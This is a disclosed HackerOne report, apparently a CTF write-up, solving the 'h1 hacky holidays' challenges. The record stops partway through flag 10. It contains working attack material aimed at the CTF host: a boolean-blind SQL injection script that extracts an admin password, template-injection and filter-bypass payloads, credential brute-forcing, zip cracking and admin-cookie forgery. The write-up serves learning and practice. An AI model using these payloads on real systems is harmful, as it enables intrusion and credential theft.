---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/buffer-over-read
  - env/web
  - vuln/sql-injection
  - vuln/ssrf
  - trigger/dns-rebinding
substate: "resolved"
weakness: "Buffer Over-read"
enriched: true
body: true
date: 2021-01-11
submitted: 2020-12-23T22:47:30.030Z
bounty_usd: null
votes: 3
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "erbbysam"
source: "https://hackerone.com/reports/1065517"
title: "h1 hacky holidays CTF solution"
---
# h1 hacky holidays CTF solution

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 3 | **Program:** h1-ctf | **Disclosed:** 2021-01-11

- Report: [https://hackerone.com/reports/1065517](https://hackerone.com/reports/1065517)
- CWE: Buffer Over-read
- Submitted: 2020-12-23T22:47:30.030Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Simple script to print all the flags. Full solution to follow (want to spend more time writing this, but am racing to be first 10 submissions):
```
echo "Flag 1 -- robots.txt"
curl https://hackyholidays.h1ctf.com/robots.txt 2>/dev/null | grep flag

echo ""
echo "Flag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )"
diff <(curl https://hackyholidays.h1ctf.com/assets/js/jquery.min.js 2>/dev/null | js-beautify) <(curl https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js 2>/dev/null | js-beautify) | grep "h1"

echo ""
echo "Flag 3 -- /people-rater"
curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= 2>/dev/null | grep flag

echo ""
echo "Flag 4 -- /swag-shop"
curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 2>/dev/null | grep flag

echo ""
echo "Flag 5 -- /secure-login (access:computer)"
wget -q https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip 2>&1 > /dev/null
unzip -P hahahaha my_secure_files_not_for_you.zip 2>&1 > /dev/null
cat flag.txt
rm my_secure_files_not_for_you.zip
rm flag.txt
rm xxx.png

echo ""
echo "Flag 6 -- /my-diary"
curl https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.php.php 2>/dev/null | grep flag

echo ""
echo "flag 7 -- /hate-mail-generator"
curl -X POST https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview --data 'preview_markup={{test}}{{email}}&preview_data={"test":"{{template:","email":"38dhs_admins_only_header.html}}"}' 2>/dev/null | grep flag


echo ""
echo "flag 8 -- /forum (grinch:BahHumbug)"
curl https://hackyholidays.h1ctf.com/forum/3/2 -H 'Cookie: token=9F315347A655FFDAF70CD4A3529EE8A6' 2>/dev/null | grep flag

echo ""
echo "flag 9 -- /evil-quiz"
curl -X POST https://hackyholidays.h1ctf.com/evil-quiz/admin --data 'username=admin&password=S3creT_p4ssw0rd-%24' 2>/dev/null | grep flag

echo ""
echo "flag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)"
curl https://hackyholidays.h1ctf.com/signup-manager/ -H 'Cookie: token=8fdaa7ac725a0f905e775a32a5cb7038' 2> /dev/null | grep flag

echo ""
echo "flag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API ->grinchadmin:s4nt4sucks)"
curl -X POST https://hackyholidays.h1ctf.com/attack-box/login --data "username=grinchadmin&password=s4nt4sucks" --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null > /dev/null
curl https://hackyholidays.h1ctf.com/attack-box/ --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag


echo ""
echo "flag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -> target=127.0.0.1)"
curl https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709 --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag
rm cookie.txt
```

output:
```
Flag 1 -- robots.txt
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}

Flag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )
<         h1_0 = 'la',
<         h1_1 = '}',
<         h1_2 = '',
<         h1_3 = 'f',
<         h1_4 = 'g',
<         h1_5 = '{b7ebcb75',
<         h1_6 = '8454-',
<         h1_7 = 'cfb9574459f7',
<         h1_8 = '-9100-4f91-';
<     document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);

Flag 3 -- /people-rater
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}

Flag 4 -- /swag-shop
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}

Flag 5 -- /secure-login (access:computer)
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

Flag 6 -- /my-diary
    <h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>

flag 7 -- /hate-mail-generator
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>

flag 8 -- /forum (grinch:BahHumbug)
                    <div class="well well-sm" style="margin:0;font-size:12px">We've launched our recon server, gathered intelligence and pin pointed Santa's location!<br>Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!<br><br><strong>flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}</strong></div>

flag 9 -- /evil-quiz
            <h3 class="text-center">flag{6e8a2df4-5b14-400f-a85a-08a260b59135}</h3>

flag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)
                <p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>

flag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API ->grinchadmin:s4nt4sucks)
        <h4 class="text-center">flag{07a03135-9778-4dee-a83c-7ec330728e72}</h4>

flag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -> target=127.0.0.1)
        <p><strong>flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}</strong></p>
```

## Impact

critical, we must stop the Grinch!

## Timeline

- **Report Filed**
- **2020-12-27** @erbbysam: Full writeup follows. Thank you for hosting this CTF!
-Sam

# Flag 1 -- robots.txt
Simply visiting https://hackyholidays.h1ctf.com/robots.txt reveals the first flag!
```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

# Flag 2 -- JavaScript
Most of the JavaScript on https://hackyholidays.h1ctf.com/ is externally hosted. There is one exception:
https://hackyholidays.h1ctf.com/assets/js/jquery.min.js 

On closer inspection, this jQuery version has been modified.

The difference becomes obvious when de-minified and diffed with an externally hosted copy:
`diff <(curl https://hackyholidays.h1ctf.com/assets/js/jquery.min.js 2>/dev/null | js-beautify) <(curl https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js 2>/dev/null | js-beautify) | grep "h1"`
(linux req: https://github.com/beautify-web/js-beautify)

Output:
```
<         h1_0 = 'la',
<         h1_1 = '}',
<         h1_2 = '',
<         h1_3 = 'f',
<         h1_4 = 'g',
<         h1_5 = '{b7ebcb75',
<         h1_6 = '8454-',
<         h1_7 = 'cfb9574459f7',
<         h1_8 = '-9100-4f91-';
<     document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
```

Running this JavaScript reconstructs the flag:
```
h1_0  =  'la',
h1_1  =  '}',
h1_2  =  '',
h1_3  =  'f',
h1_4  =  'g',
h1_5  =  '{b7ebcb75',
h1_6  =  '8454-',
h1_7  =  'cfb9574459f7',
h1_8  =  '-9100-4f91-';
console.log( h1_2  +  h1_3  +  h1_0  +  h1_4  +  h1_2  +  h1_5  +  h1_8  +  h1_6  +  h1_7  +  h1_1);
```
Output:
`flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`

# Flag 3 -- /people-rater
### Basic functionality
https://hackyholidays.h1ctf.com/people-rater lists people. When you click a name, their rating is revealed.

This rating uses an API, for example:
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=
Output:
```
{
  "id": "eyJpZCI6Mn0=",
  "name": "Tea Avery",
  "rating": "Awful"
}
```

### Hack
Note the base64 `id` parameter above. The decoded base64 is `{"id":2}`. A careful examination of the page reveals that `{"id":1}` is skipped in the list of people.

Sending `{"id":1}` directly to the API reveals the flag:
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=
Output:
```
{
  "id": "eyJpZCI6MX0=",
  "name": "The Grinch",
  "rating": "Amazing in every possible way!",
  "flag": "flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}
```
# Flag 4 -- /swag-shop
### Basic functionality
https://hackyholidays.h1ctf.com/swag-shop is a store where the user is not authenticated. No credentials are provided and the user cannot register.
### Hack
Using dirsearch recursively on /swag-shop, we can identify API endpoints:
```
# python3 dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -r -u https://hackyholidays.h1ctf.com/swag-shop/

 _|. _ _  _  _  _ _|_    
(_||| _) (/_(_|| (_| )

Extensions: conf, config, bak, backup, swp, old, db, sql, asp, aspx, aspx~, asp~, py, py~, rb, rb~, php, php~, bkp, cache, cgi, csv, html, inc, jar, js, json, jsp, jsp~, lock, log, rar, sql.gz, http://sql.zip, sql.tar.gz, sql~, swp~, tar, tar.bz2, tar.gz, txt, wadl, zip, .log, .xml, .js., .json | HTTP method: get | Threads: 10 | Wordlist size: 23721 | Recursion level: 1

Target: https://hackyholidays.h1ctf.com/swag-shop/

[18:17:29] Starting:
[18:18:11] 200 -   23B  - /swag-shop/api
[18:18:11] 200 -   23B  - /swag-shop/api/
[18:18:52] Starting: api/
[18:20:06] 200 -    2KB - /swag-shop/api/sessions/
[18:20:06] 200 -    2KB - /swag-shop/api/sessions
[18:20:14] 400 -   35B  - /swag-shop/api/user
[18:20:14] 400 -   35B  - /swag-shop/api/user/

Task Completed
```

Using the /api/session endpoint, we can list presumably users connected to /swag-shop:
https://hackyholidays.h1ctf.com/swag-shop/api/sessions

Output:
```
{
  "sessions": [
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
    "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
  ]
}
```

The session with the longest string clearly stands out. Decoded that base64 string:
`{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}`

Visiting the /api/user endpoint we are clearly missing API fields:
https://hackyholidays.h1ctf.com/swag-shop/api/user

Output:
`{"error":"Missing required fields"}`

Using the Burp Suite Param Miner Extension  ("Guess GET parameters" option), we can easily identify the missing required field. This identifies the "secret" parameter `uuid`!

Using the `uuid` provided above by the /api/session endpoint, we find the flag:
https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
Output:
```
{
  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username": "grinch",
  "address": {
    "line_1": "The Grinch",
    "line_2": "The Cave",
    "line_3": "Mount Crumpit",
    "line_4": "Whoville"
  },
  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

# Flag 5 -- /secure-login
### Basic functionality
https://hackyholidays.h1ctf.com/secure-login is a basic login page.
### Hack
The default error message says "Invalid Username".

Enumerating usernames using Burp Suite Intruder, we see the username `access` receives a different response: "Invalid Password"
(wordlist: https://github.com/jeanphorn/wordlist/blob/master/usernames.txt)

Enumerating passwords using Burp Suite Intruder with the built-in password word list, reveals the password is `computer`.

After logging in with`access:computer`, we receive the error message "No Files To Download".

The cookie set when logging in is:
`securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D;`

Decoding this base64 reveals JSON with an "admin" field:
`{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`

Changing `admin` to `true` and reloading this page reveals a link to a file:
https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip

This zip file is password protected; however, we can brute-force this password:
```
# fcrackzip -u -v -D -p 'xato.txt' my_secure_files_not_for_you.zip
found file 'xxx.png', (size cp/uc 215105/215058, flags 9, chk 852f)
found file 'flag.txt', (size cp/uc     55/    43, flags 9, chk 82ca)


PASSWORD FOUND!!!!: pw == hahahaha
```
(tool used: http://manpages.ubuntu.com/manpages/trusty/man1/fcrackzip.1.html)
(word list used: https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-1000000.txt)

With this password we can print our flag:
```
wget -q https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip 2>&1 > /dev/null
unzip -P hahahaha my_secure_files_not_for_you.zip 2>&1 > /dev/null
cat flag.txt
rm my_secure_files_not_for_you.zip
rm flag.txt
rm xxx.png
```
Output:
`flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`

# Flag 6 -- /my-diary
### Basic functionality
https://hackyholidays.h1ctf.com/my-diary/ reveals the Grinch's diary! Notably, the page redirects to https://hackyholidays.h1ctf.com/my-diary/?template=entries.html

### Hack

Guessing other possible template file names, I reached:
https://hackyholidays.h1ctf.com/my-diary/?template=index.php

This loads the PHP source code of base page (`index.php`) as a template and renders it as html, allowing us to see the PHP source code behind this page:
```
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

We clearly want to reach secretadmin.php; however. we must find a bypass for the two PHP string replacement functions (`str_replace`). We can accomplish this by leveraging the fact that these functions only are applied once, not recursively. Working backwards:
```
end goal: secretadmin.php
str_replace("secretadmin.php","",$page) bypass (secretadmin.php -> secretsecretadmin.phpadmin.php): secretsecretadmin.phpadmin.php
str_replace("admin.php","",$page) bypass (admin.php -> adminadmin.php.php): secretsecretadminadmin.php.phpadminadmin.php.php
```

Using our bypass, we reveal the flag:
https://hackyholidays.h1ctf.com/my-diary/?template=secretsecretadminadmin.php.phpadminadmin.php.php
`flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`

# Flag 7 -- /hate-mail-generator 
### Basic functionality
https://hackyholidays.h1ctf.com/hate-mail-generator is a mail generator that uses a custom templating language.

### Hack
Using dirsearch here reveals a `templates` directory:
```
# python3 dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -r -u https://hackyholidays.h1ctf.com/hate-mail-generator/

 _|. _ _  _  _  _ _|_    v
(_||| _) (/_(_|| (_| )

Extensions: conf, config, bak, backup, swp, old, db, sql, asp, aspx, aspx~, asp~, py, py~, rb, rb~, php, php~, bkp, cache, cgi, csv, html, inc, jar, js, json, jsp, jsp~, lock, log, rar, sql.gz, http://sql.zip, sql.tar.gz, sql~, swp~, tar, tar.bz2, tar.gz, txt, wadl, zip, .log, .xml, .js., .json | HTTP method: get | Threads: 10 | Wordlist size: 23721 | Recursion level: 1

Target: https://hackyholidays.h1ctf.com/hate-mail-generator/

[03:50:37] Starting:
[03:51:45] 200 -    2KB - /hate-mail-generator/new
[03:52:00] 302 -    0B  - /hate-mail-generator/templates  ->  /hate-mail-generator/templates/
[03:52:00] 200 -  623B  - /hate-mail-generator/templates/
[03:52:05] Starting: templates/

Task Completed
```

This directory is not properly protected. Visiting it reveals a directory list:
https://hackyholidays.h1ctf.com/hate-mail-generator/templates/
```
Index of /hate-mail-generator/templates/
../
cbdj3_grinch_header.html                                     20-Apr-2020 10:00                   -
cbdj3_grinch_footer.html                                     20-Apr-2020 10:00                   -
38dhs_admins_only_header.html                                21-Apr-2020 15:29                  46
```

We want to access the template `38dhs_admins_only_header.html`. 

Attempting to preview a email containing the template `You do not have access to the file 38dhs_admins_only_header.html` reveals the following error:
HTTP Request:
```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Connection: close

preview_markup={{template:38dhs_admins_only_header.html}}&preview_data={}
```

HTTP Response:
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 26 Dec 2020 03:58:48 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 64

You do not have access to the file 38dhs_admins_only_header.html
```

We can bypass this using the `preview_data` field which appears to pre-process the markup. This pre-process is done after the permission checks occur on the allowable templates, but before the templates are loaded!

HTTP Request:
```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Connection: close

preview_markup={{test}}{{email}}&preview_data={"test":"{{template:","email":"38dhs_admins_only_header.html}}"}
```

HTTP Response:
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 26 Dec 2020 04:00:50 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 339

<html>
<body>
<center>
    <table width="700">
        <tr>
            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
        </tr>
        <tr>
            <td style="padding:20px 10px 20px 10px">
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
```

# Flag 8 -- /forum 
### Basic functionality
https://hackyholidays.h1ctf.com/forum is a basic forum which contains posts from both `grinch` and `max`. There is also a login field and an admin area which we cannot access.
### Hack
Using dirsearch, we can identify a `phpmyadmin` subfolder (phpMyAdmin is a MySQL database visualization tool) :
```
# python3 dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -u https://hackyholidays.h1ctf.com/forum/

 _|. _ _  _  _  _ _|_    v
(_||| _) (/_(_|| (_| )

Extensions: conf, config, bak, backup, swp, old, db, sql, asp, aspx, aspx~, asp~, py, py~, rb, rb~, php, php~, bkp, cache, cgi, csv, html, inc, jar, js, json, jsp, jsp~, lock, log, rar, sql.gz, http://sql.zip, sql.tar.gz, sql~, swp~, tar, tar.bz2, tar.gz, txt, wadl, zip, .log, .xml, .js., .json | HTTP method: get | Threads: 10 | Wordlist size: 23721

Target: https://hackyholidays.h1ctf.com/forum/

[04:03:38] Starting:
[04:03:41] 200 -    2KB - /forum/1
[04:03:41] 200 -    2KB - /forum/2
[04:04:40] 200 -    2KB - /forum/login
[04:04:41] 200 -    2KB - /forum/login/
[04:04:50] 200 -    9KB - /forum/phpmyadmin
[04:04:50] 200 -    9KB - /forum/phpmyadmin/

Task Completed
```
Additionally, the source code of this forum was "leaked" online on github.com. Going through the commit history, we can see the database credentials were accidentally committed:
https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae


Logging into https://hackyholidays.h1ctf.com/forum/phpmyadmin using `forum:6HgeAZ0qC9T6CQIqJpD` we can spot a user table which contains hashed passwords:
```
id	username	password	                        admin
1	grinch	    35D652126CA1706B59DB02C93E0C9FBF	1
2	max         388E015BC43980947FCE0E5DB16481D1
```

Using a free MD5 hash reversal service online, we can identify that the grinch's password is `BahHumbug`:
https://md5.gromweb.com/?md5=35D652126CA1706B59DB02C93E0C9FBF

Logging in using `grinch:BahHumbug` reveals the flag:
```
curl -X POST https://hackyholidays.h1ctf.com/forum/login --data 'username=grinch&password=BahHumbug' --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null > /dev/null
curl https://hackyholidays.h1ctf.com/forum/3/2 --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag
rm cookie.txt
```
Output:
`<div class="well well-sm" style="margin:0;font-size:12px">We've launched our recon server, gathered intelligence and pin pointed Santa's location!<br>Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!<br><br><strong>flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}</strong></div>`


# Flag 9 -- /evil-quiz
### Basic functionality
https://hackyholidays.h1ctf.com/evil-quiz is an interactive system where you enter your name and take a quiz. The final result page gives you:
 - an evil score
 - a count of other players who share your name

This site keeps track of your name and score server-side and uses a client-side `session` cookie.
### Hack
The `Your Name` field on the first page has a SQL injection vulnerability. However, the vulnerable query is only executed on the final the page that shows your score/similarly named player count. This prevents tools such as sqlmap from identifying this.

This is exploitable using a time/SLEEP based blind SQLi. We can exploit this faster by taking advantage of the "similarly named player count" field. The name `test` returns many users with the same name on the final result page, while the name `invalidName654321` will not return any additional users. We can craft a SQLi exploit that takes advantage of this, returning `test` when a query is `true` and `invalidName654321` when a query is `false`. This technique is called `Boolean Based Blind SQL Injection`.

Python script to print admin password:
```
import requests

# note that using this technique I have already determined that the data I'm looking for is in the 'admin' table within this database under the columns 'username'/'password'
# this script is similar to one used here in a real vulnerability -- https://hackerone.com/reports/982202

# WARNING: grab a fresh session cookie before running
cookie = "832b58a541df03e22d9d8b432035040b"

def test(inject, cookie):
    headers = {'Cookie': 'session=' + cookie}
    data = {'name': "invalidName654321' or name=(SELECT IF(" +inject + ",'test','invalidName654321')) AND 'quote'='quote"}

    # first stage, send name in with blind SQLi payload
    r = requests.post('https://hackyholidays.h1ctf.com/evil-quiz', headers=headers, data=data, timeout=10)

    # second stage, trigger blind SQLi with the "get score" request
    r = requests.get('https://hackyholidays.h1ctf.com/evil-quiz/score', headers=headers, timeout=10)
    if "There is 0 other player" in r.text:
        return False
    else:
        return True


offsetId = 0
while True:
    prefix = ""

    while True:
        hit = False

        for i in range(32,127):
            # "BINARY" is required here to get case-sensitive output
            dataInput= "BINARY '" + str(prefix+chr(i)) + "'=(select SUBSTRING(password,1," + str(len(prefix)+1) + ") from admin LIMIT " + str(offsetId) + ", 1)"

            if test(dataInput, cookie):
                print("HIT " + chr(i))
                prefix = prefix + chr(i)
                hit = True
                break

        if hit == False:
            print("all done -- " + prefix)
            break

    offsetId = offsetId + 1

```
Output (after a few minutes):
```
HIT S
HIT 3
HIT c
HIT r
HIT e
HIT T
HIT _
HIT p
HIT 4
HIT s
HIT s
HIT w
HIT 0
HIT r
HIT d
HIT -
HIT $
all done -- S3creT_p4ssw0rd-$
```

Logging in reveals the flag:
```
curl -X POST https://hackyholidays.h1ctf.com/evil-quiz/admin --data 'username=admin&password=S3creT_p4ssw0rd-%24' 2>/dev/null | grep flag
```
Output:
```
<h3 class="text-center">flag{6e8a2df4-5b14-400f-a85a-08a260b59135}</h3>
```


# Flag 10 -- /signup-manager
### Basic functionality
https://hackyholidays.h1ctf.com/signup-manager/ allows a user to register and log in. Once logged in, the user is prompted with: `We'll have a look into you and see if you're evil enough to join the grinch army!`
### Hack
Using dirsearch, we can spot a few interesting files:
```
# python3 dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -u https://hackyholidays.h1ctf.com/signup-manager/

 _|. _ _  _  _  _ _|_    
(_||| _) (/_(_|| (_| )

Extensions: conf, config, bak, backup, swp, old, db, sql, asp, aspx, aspx~, asp~, py, py~, rb, rb~, php, php~, bkp, cache, cgi, csv, html, inc, jar, js, json, jsp, jsp~, lock, log, rar, sql.gz, http://sql.zip, sql.tar.gz, sql~, swp~, tar, tar.bz2, tar.gz, txt, wadl, zip, .log, .xml, .js., .json | HTTP method: get | Threads: 10 | Wordlist size: 23721

Target: https://hackyholidays.h1ctf.com/signup-manager/

[04:45:28] Starting:
[04:45:38] 200 -   36B  - /signup-manager/admin.php
[04:46:24] 200 -   15KB - /signup-manager/index.php
[04:46:36] 200 -  712B  - /signup-manager/README.md
[04:46:46] 200 -   36B  - /signup-manager/user.php

Task Completed
```

Looking at https://hackyholidays.h1ctf.com/signup-manager/README.md we can read the install instructions for this website. This points to a zip file:
